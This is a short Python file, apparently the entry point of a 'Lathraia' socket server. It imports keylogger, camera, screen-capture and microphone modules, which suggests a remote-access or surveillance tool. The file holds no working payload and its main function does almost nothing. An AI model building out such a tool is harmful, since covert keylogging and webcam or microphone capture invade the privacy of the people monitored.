# This is the main server program. This sets up everything so it shall work.
# However, to say that this program executes and does everything by itself is a false-hood.
# The entire Lathraia server is comprised of other programs, but this file mainly interprets
# socket python commands, so that they may be run.

import os
import socket
import sys
import time
import threading
import functions
import inspect
import multiprocessing
import asyncio

from socket import error as SocketException
from server import Server
from configuration import *

import camera_server
import screen_server
import keylogger
import mic_server

try:    
    import screen_server
except:
    pass

try: 
    import keylogger
except:
    pass

try:
    import camera_server
except:
    print("Error")


def main():
    # Main program loop!

    # Automatically execute all scripts.
    #autoexec()
    
    s = Server()
    #s.start()
        

        

        

if __name__ == "__main__":
    main()
